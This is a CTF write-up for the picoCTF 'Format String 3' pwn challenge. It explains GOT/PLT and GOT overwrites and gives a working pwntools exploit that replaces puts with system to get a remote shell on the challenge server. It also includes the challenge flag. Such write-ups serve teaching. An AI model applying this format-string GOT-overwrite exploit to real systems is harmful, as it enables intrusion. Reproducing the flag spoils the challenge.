## CTF: picoCTF 2024

Challenge: Format String 3

Category: pwn

Points: 10

Difficulty: Intermediate

## Instructions

This program doesn't contain a win function. How can you win?

## Solution

This is a culmination of all the format-string challenges so far. It involves using a GOT overwrite to call /bin/sh and cat out the flag on the remote server. It's important to know what the GOT and PLT are and how it gets overwritten first. It will then make more sense of what this challenge is actually asking you.

### GOT and PLT

Lets start with the **Procedure Linkage Table (PLT). **The best way for me to think about the PLT is like an assistant at the front of the office. A program will call puts@PLT which justs asks the assistant where puts is. The PLT will then look up the address of puts in the **Global Offset Table(GOT). **The global offset table is exactly what it sounds like, a global table that holds a lot of address offsets. Specifically, address offsets from libcs base. libc is just the standard library that holds all basic functions for C. Because of ASLR, libc's address changes everytime you run the program, meaning you can't simply just call puts, but have to go through the process of invoking the PLT to look up the address of puts in the GOT. How does the GOT know where puts is then? Well when the program first calls puts, it doesn't. If this is the first time puts has been used, the GOT will have an address that calls the top of the PLT. This code at the top of the PLT will resolve the address of puts and then put it into the GOT. Now any other call to puts@plt will call the PLT and the PLT will look at the address in the global offset table, immediately calling the correct function. This is a high level overview, but there are great videos and resources out there that explain it in more depth. It is imperative to learn how dynamic linking works to complete this problem effectively.

### GOT Overwrite

To perform a GOT overwrite, we simply need to put into the global offset table, the address we actually want to call. So when the the PLT looks for the address of puts for example, it will retrieve the address of system instead of puts. It doesn't know that it is the wrong function, it just takes whatever address is there. So we need to find the function of interest we want to overwrite, find where address of where the plt tries to read from the GOT, and finally overwrite the value at the address with the function of our choice. Lets try to apply this to our current problem.

### Solve

So lets do our baseline checks, file and checksec.

```bash
format-string-1: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=0db53838d4fb91afc72fb5ef54784f256d129f24, for GNU/Linux 3.2.0, not stripped

┌──(shinigami㉿shinigami)-[~/DrBrown]
└─$ checksec format-string-3
[*] '/home/shinigami/DrBrown/format-string-3'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x3fe000)
    RUNPATH:    b'.'
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No

```

We can see that it has a canary, nx is enabled, but no pie. It's also a 64-bit executable, dynamically linked and not stripped. Lets try running it and seeing what happens.

```bash
./format-string-3
Howdy gamers!
Okay I'll be nice. Here's the address of setvbuf in libc: 0x7f2a0d7873f0
aaaaaaaaaaaaaa
aaaaaaaaaaaaaa
/bin/sh

```

We see that our input is sent back to us and it's printing /bin/sh, lets see if it's vulnerable to a format-string vulnerability.

```bash
./format-string-3
Howdy gamers!
Okay I'll be nice. Here's the address of setvbuf in libc: 0x7f01e0f113f0
%p
0x7f01e106f963
/bin/sh
```

It sure is, it is also giving us a leak to setvbuf. Since this challenge gave us the libc and linker in the problem, we already have everything we need for a GOT overwrite, we do need to look at this program a little closer so we can know what we want to call. We see that there are two custom functions called in this program besides main. Lets disass main and look for anything interesting.

```bash
0x00000000004011a6  setup
0x000000000040120b  hello
0x0000000000401243  main
```

Looking at main, we see it calls both setup and main.

```bash
   0x0000000000401294 <+81>:	call   0x4011a6 <setup>
   0x0000000000401299 <+86>:	mov    eax,0x0
   0x000000000040129e <+91>:	call   0x40120b <hello>
```

Setup and hello aren't terribly interesting, the most interesting part is the final puts in main, which seems to call puts to print /bin/sh to the screen. Lets look at how these functions are called to see why this is convenient.

```bash
int puts(const char *s);
int system(const char *command);
```

They both take a string, it just so happens that puts is printing /bin/sh, which if system took thee same string, which would pop us a shell. This makes our life easy, all we need to do is overwrite the address in the GOT that points to puts to system. Lets see how we would find these addresses. Luckily PIE is not enabled, so the addresses of both puts@plt and the address it jumps to in the GOT will stay the same. Only thing that will still change is the actual address of libc and in turn systems address, but we will use the leak we got to calculate that later. For now, lets find those PLT and GOT addresses.

```bash
0x00000000004012dc <+153>:	call   0x401080 <puts@plt>
```

The address of puts@plt is 0x401080. Lets see what is there.

```bash
   0x0000000000401080 <+0>:	endbr64
   0x0000000000401084 <+4>:	jmp    QWORD PTR [rip+0x2f76]        # 0x404000 <puts@got.plt>
   0x000000000040108a <+10>:	nop    WORD PTR [rax+rax*1+0x0]

```

We see that it will jump to 0x404000, the address that should have puts in libc in it. I ran the program so it's actually able to put the libc address of puts in the GOT.

```bash
0x404000 <puts@got.plt>:	0xf7e57bf0	0x00007fff	0x00401040	0x00000000
gef➤  disass 0x7ffff7e57bf0
Dump of assembler code for function puts:
   0x00007ffff7e57bf0 <+0>:	endbr64
   0x00007ffff7e57bf4 <+4>:	push   r14
   0x00007ffff7e57bf6 <+6>:	push   r13
   0x00007ffff7e57bf8 <+8>:	push   r12
   0x00007ffff7e57bfa <+10>:	push   rbp
```

Here you see that the address of puts is indeed in the GOT. This means we need to use our format string vulnerability to write the address of system @ 0x404000. The last piece we need is the address of system. This is when we will utilize our leaked address that prints at the starts of the program. Since they gave us the libc version we should be using, we can load it into our exploit program. We can then get the leaked address and subtract it from the known offset it is from libc's base address. We can then find any other function based on the known offset from the base of libc. We now have everything besides when we start reading our own input, we can just run some fuzzing to get this info. After some fuzzing, you will find out the offset is 38. Time to write our exploit.

### Exploit

```bash
from pwn import *
libc = ELF('libc.so.6')
elf = context.binary = ELF("./format-string-3")
#p = process()
#gdb.attach(p,"break *main+150")
p =  remote('xebec.cylabacademy.net', 33867)
p.recvuntil(":")
leaked = p.recvline().strip()
libc.address = int(leaked,16) - libc.symbols['setvbuf']
system = libc.symbols['system']
print(hex(system))
#puts = elf.got["puts"]

payload = fmtstr_payload(38, {elf.got.puts : system})
p.sendline(payload)
p.interactive()
```

## Flag

academy{G07_G07?_d4aea0bd}

## Mitigation

Don't have a format string vulnerability and never trust input from the user. Always check for the size, and use printf correctly.